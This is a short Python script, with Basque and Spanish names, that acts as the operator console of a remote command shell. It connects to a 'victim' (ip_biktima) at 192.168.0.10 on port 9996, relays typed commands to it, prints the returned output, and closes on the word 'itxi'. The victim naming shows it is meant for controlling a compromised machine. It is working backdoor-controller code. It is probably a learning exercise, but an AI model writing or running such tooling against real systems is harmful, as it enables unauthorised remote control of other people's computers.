import socket 
import time


class cliente(object):
    def __init__(self,ip_biktima,portua):
        self.so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.so.connect((ip_biktima,portua))
    
    def koneksioa(self):
        while True:
            #url
            recibido = self.so.recv(4095)
            url = str(recibido,encoding='utf-8')
            #comandoa
            mensaje = input(url + ">")
            mensaje_b = bytes(mensaje,encoding= "utf-8")
            self.so.send(mensaje_b)
            #luzehera
            lu = self.so.recv(4096)
            #itxi
            if mensaje == "itxi":
                break
            #emaitza
            recibido = self.so.recv(int(lu))
            print(str(recibido,encoding = 'utf-8'))
            #ongi hartu duzula ziurtatzeko
            self.so.send(bytes("ok",encoding = "utf-8"))
        print("agur")
        self.so.close()

cliente = cliente("192.168.0.10",9996)
cliente.koneksioa()


